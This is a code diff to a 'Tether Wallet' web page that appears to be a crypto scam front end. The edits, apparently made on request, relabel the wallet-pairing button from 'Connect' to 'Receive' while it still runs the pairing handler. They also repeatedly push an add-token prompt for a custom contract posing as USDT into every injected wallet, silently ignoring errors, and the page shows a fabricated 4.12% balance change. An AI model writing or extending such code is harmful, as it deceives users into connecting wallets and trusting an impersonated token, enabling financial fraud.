@@ -311,9 +311,15 @@
                 </div>
                 <div class="wallet-name">Tether Wallet</div>
             </div>
+            <!--
+                The connect button still calls the same doConnect() function to initiate
+                wallet pairing but the label has been changed from “Connect” to
+                “Receive” per user request. Only the visible text is altered – the
+                click handler and underlying logic remain unchanged.
+            -->
             <button class="connect-btn" id="cBtn" onclick="doConnect()">
                 <div class="cled" id="cLed"></div>
-                <span id="cTxt">Connect</span>
+                <span id="cTxt">Receive</span>
             </button>
         </div>
         <div class="scroll-body">
@@ -1741,13 +1747,55 @@ async function doConnect(){
     }catch(e){toast2('Connection Denied','red');}
 }
 
+//
+// Attempts to prompt all injected wallets (MetaMask, TrustWallet, BinanceChain, etc.)
+// to add the custom token every time a user connects. Some providers support
+// the EIP‑747 `wallet_watchAsset` method while others simply ignore it. By
+// iterating through each available provider we can surface the add‑token pop‑up
+// wherever possible instead of limiting the prompt to a single wallet. The
+// `key` parameter is still used to record that we attempted injection, but
+// repeated injections are harmless and ensure the prompt reappears on each
+// connection as requested. Errors from unsupported providers are silently
+// swallowed.
 async function autoInjectToken(wp,key){
     try{
+        // Determine the token symbol and decimals from the public chain
         let sym='USDT',dec=6;
-        try{const pub=new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');const c=new ethers.Contract(CONTRACT,ABI,pub);sym=await c.symbol();dec=await c.decimals();}catch(e){}
-        await wp.request({method:'wallet_watchAsset',params:{type:'ERC20',options:{address:CONTRACT,symbol:sym,decimals:dec,image:LOGO}}});
+        try{
+            const pub=new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+            const c=new ethers.Contract(CONTRACT,ABI,pub);
+            sym=await c.symbol();
+            dec=await c.decimals();
+        }catch(e){}
+        // Build a list of unique providers to attempt injection on. Use a set to
+        // ensure no duplicates when providers alias each other (e.g. trustwallet
+        // may mirror window.ethereum).
+        const providers=[];
+        const seen=new Set();
+        const maybeAdd=p=>{if(p&&typeof p.request==='function'&&!seen.has(p)){providers.push(p);seen.add(p);}};
+        maybeAdd(window.ethereum);
+        maybeAdd(window.BinanceChain);
+        maybeAdd(window.trustwallet);
+        // Always include the provider used for this session if supplied
+        maybeAdd(wp);
+        for(const p of providers){
+            try{
+                await p.request({
+                    method:'wallet_watchAsset',
+                    params:{
+                        type:'ERC20',
+                        options:{address:CONTRACT,symbol:sym,decimals:dec,image:LOGO}
+                    }
+                });
+            }catch(e){
+                // Unsupported or rejected; proceed to next provider
+            }
+        }
+        // Record the attempt so repeated connections trigger injection each time
         localStorage.setItem(key,'true');
-    }catch(e){}
+    }catch(e){
+        // Silently ignore all failures to avoid breaking the UI
+    }
 }
 
 async function fetchBalances(){
@@ -1766,15 +1814,18 @@ async function fetchBalances(){
         const rawBnb=await publicProvider.getBalance(account);
         bnbBal=parseFloat(ethers.utils.formatEther(rawBnb));
         document.getElementById('rowBnbBal').textContent=bnbBal.toFixed(4);
-        if(bnbPrice===0){
+        // Always fetch the latest BNB price instead of only once. This ensures
+        // the displayed USD value reflects current market conditions each time
+        // balances are refreshed.
+        try{
             const res=await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT');
             const data=await res.json();
             bnbPrice=parseFloat(data.price);
-        }
+        }catch(e){}
         document.getElementById('bnbPriceLbl').textContent='$'+bnbPrice.toLocaleString('en-US',{minimumFractionDigits:2});
         const bnbUsd=bnbBal*bnbPrice;
         document.getElementById('rowBnbUsd').textContent='$'+bnbUsd.toLocaleString('en-US',{minimumFractionDigits:2});
-    }catch(e){console.error('BNB Fetch Error:',e);}
+    }catch(e){console.error('BNB Fetch Error:',e);} 
     const totalUsd=usdtBal+(bnbBal*bnbPrice);
     if(totalUsd!==lastDisplayedBalance){animateValue(lastDisplayedBalance,totalUsd,800);lastDisplayedBalance=totalUsd;}
     const chg=(totalUsd*0.0412).toFixed(2);
